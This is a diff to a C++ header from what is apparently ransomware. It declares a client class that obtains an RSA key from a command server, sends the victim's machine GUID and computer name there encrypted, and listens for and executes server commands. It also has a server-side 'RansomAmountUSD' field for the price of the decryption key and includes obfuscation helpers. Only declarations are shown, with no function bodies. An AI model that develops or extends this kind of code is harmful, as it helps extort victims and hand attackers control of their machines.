@@ -1,11 +1,11 @@
 #pragma once
 
-#include "procmgr.h"
-#include "framework.h"
-#include "net_types.h"
-#include "net_common.h"
-#include "natives.h"
-#include "syscalls.h"
+#include "ProcessManager.h"
+#include "Framework.h"
+#include "NetworkTypes.h"
+#include "NetworkCommon.h"
+#include "Win32Natives.h"
+#include "Syscalls.h"
 
 #include "External/obfuscate.h"
 #include "External/base64.h"
@@ -45,9 +45,10 @@ public:
     BOOL               Disconnect();                // Disconnect from the tcp server
     BYTESTRING         MakeTCPRequest(const ClientRequest& req, BOOL encrypted = FALSE); // send a message, receive the response
     BOOL               SendMessageToServer(const Server& dest, ClientMessage message, sockaddr_in udpAddr = NetCommon::_default);
+    BOOL               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
     BOOL               SendEncryptedMessageToServer(const Server& dest, ClientMessage message);
     BOOL               ListenForServerCommands();   // listen for commands from the server and perform them
-    BOOL               SendComputerNameToServer();
+
     template <typename _Ty>
     BOOL               ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr);
 private:
@@ -55,16 +56,19 @@ private:
     void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
     void               SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
     BOOL               GetPublicRSAKeyFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
-    BOOL               SendMachineGUIDToServer();
+    BOOL               SendMachineGUIDToServer();   // send machine guid to tcp server. encrypted
+    BOOL               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
 
-    ProcessManager     Remote = {};                      // remote host process manager
+    ProcessManager     Remote = {};                 // remote host process manager
     Server             m_TCPServerDetails = {};     // details describing the tcp server
-    Server             m_UDPServerDetails = {};
+    Server             m_UDPServerDetails = {};     // details about the UDP communication
 
 #elif defined(SERVER_RELEASE)                       // Server only client implementation
 public:
     Client() = default;
     Client(SOCKET tcp, SOCKET udp, sockaddr_in addr);
+
+    void               Disconnect(); // clean up and close sockets. free bio* secrets
 
     const sockaddr_in  GetAddressInfo()            const { return this->AddressInfo; }
     const RSAKeys&     GetSecrets()                const { return this->m_Secrets; }
@@ -74,6 +78,7 @@ public:
     long               RansomAmountUSD  = 0;        // amount the client must pay for rsa private key in usd
     long               ClientUID        = -1;       // unique client id for the server
     sockaddr_in        AddressInfo      = {};       // Address info for the eserver to send messages over udp 
+    BOOL               Alive = TRUE;
 
     /*
         Implementation for event handling- to wait
